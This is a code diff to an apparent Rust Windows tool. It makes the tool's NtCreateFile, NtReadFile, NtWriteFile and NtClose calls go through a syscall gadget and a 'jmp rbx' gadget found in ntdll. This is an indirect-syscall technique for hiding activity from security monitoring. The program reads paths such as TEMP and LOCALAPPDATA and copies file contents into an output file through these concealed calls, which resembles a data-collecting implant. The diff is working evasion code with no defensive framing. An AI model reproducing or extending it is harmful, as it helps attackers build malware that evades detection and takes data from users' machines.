@@ -64,6 +64,9 @@ fn main() {
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
+        let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
+        let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");
+
         let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
         let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
 
@@ -84,6 +87,8 @@ fn main() {
 
         let status = syscall!(
             nt_create_file_ssn,
+            syscall_gadget,
+            jmp_rbx_gadget,
             &mut out_handle as *mut _ as usize,
             (GENERIC_WRITE | SYNCHRONIZE) as usize,
             &mut obj_attr as *mut _ as usize,
@@ -118,6 +123,8 @@ fn main() {
 
             let status = syscall!(
                 nt_create_file_ssn,
+                syscall_gadget,
+                jmp_rbx_gadget,
                 &mut in_handle as *mut _ as usize,
                 (GENERIC_READ | SYNCHRONIZE) as usize,
                 &mut in_obj_attr as *mut _ as usize,
@@ -137,6 +144,8 @@ fn main() {
                     let mut read_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                     let status = syscall!(
                         nt_read_file_ssn,
+                        syscall_gadget,
+                        jmp_rbx_gadget,
                         in_handle as usize,
                         0,
                         0,
@@ -155,6 +164,8 @@ fn main() {
                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                     syscall!(
                         nt_write_file_ssn,
+                        syscall_gadget,
+                        jmp_rbx_gadget,
                         out_handle as usize,
                         0,
                         0,
@@ -166,10 +177,10 @@ fn main() {
                         0
                     );
                 }
-                syscall!(nt_close_ssn, in_handle as usize);
+                syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, in_handle as usize);
             }
         }
 
-        syscall!(nt_close_ssn, out_handle as usize);
+        syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
     }
 }
